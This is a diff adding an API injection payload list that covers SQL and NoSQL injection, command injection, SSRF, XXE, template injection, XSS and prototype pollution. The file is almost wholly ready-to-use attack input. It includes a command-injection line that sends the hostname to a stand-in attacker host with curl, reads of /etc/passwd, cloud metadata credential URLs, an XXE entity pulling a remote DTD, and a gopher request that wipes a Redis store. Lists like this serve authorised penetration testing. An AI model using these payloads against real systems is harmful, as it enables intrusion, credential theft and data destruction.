@@ -1,0 +1,88 @@
+# API injection payloads (SQLi, NoSQLi, cmd, SSRF, XXE)
+
+# ====== SQL Injection ======
+'
+' OR '1'='1
+' OR '1'='1'-- -
+" OR "1"="1
+1' UNION SELECT NULL-- -
+1'; WAITFOR DELAY '0:0:5'--
+1 AND SLEEP(5)--
+1)) OR SLEEP(5)--
+'; SELECT pg_sleep(5)--
+
+# JSON-wrapped SQLi
+{"id": "1' OR '1'='1"}
+{"search": "' UNION SELECT username,password FROM users-- -"}
+
+# ====== NoSQL Injection (Mongo etc.) ======
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
+{"$where": "this.password.length > 0"}
+{"username": {"$in": ["admin","root"]}, "password": {"$ne": ""}}
+
+# ====== Command Injection ======
+; id
+| id
+& id
+`id`
+$(id)
+; cat /etc/passwd
+%0Aid
+| curl http://attacker.tld/`hostname`
+{"cmd": "; ls -la"}
+{"file": "test.txt; cat /etc/passwd"}
+{"host": "localhost; whoami"}
+
+# ====== SSRF ======
+http://127.0.0.1
+http://127.0.0.1:22
+http://localhost
+http://[::1]
+http://0.0.0.0
+http://0177.0.0.1
+http://2130706433
+http://127.127.127.127
+
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/v1/
+http://100.100.100.200/latest/meta-data/
+
+# Internal services
+http://internal-api:8080/admin
+http://redis:6379
+http://elasticsearch:9200/_cat/indices
+http://prometheus:9090
+
+# URL parser tricks
+http://evil.tld@127.0.0.1/
+http://127.0.0.1#.evil.tld
+http://127.0.0.1%2f.evil.tld
+http://127.0.0.1./
+file:///etc/passwd
+gopher://127.0.0.1:6379/_FLUSHALL
+dict://127.0.0.1:11211/stats
+
+# ====== XXE (if XML accepted) ======
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://attacker.tld/x.dtd">%x;]><r/>
+
+# ====== Template / SSTI ======
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# ====== XSS (reflective JSON) ======
+"><script>alert(1)</script>
+javascript:alert(1)
+"><img src=x onerror=alert(1)>
+
+# ====== Prototype pollution (JS APIs) ======
+{"__proto__": {"isAdmin": true}}
+{"constructor": {"prototype": {"isAdmin": true}}}
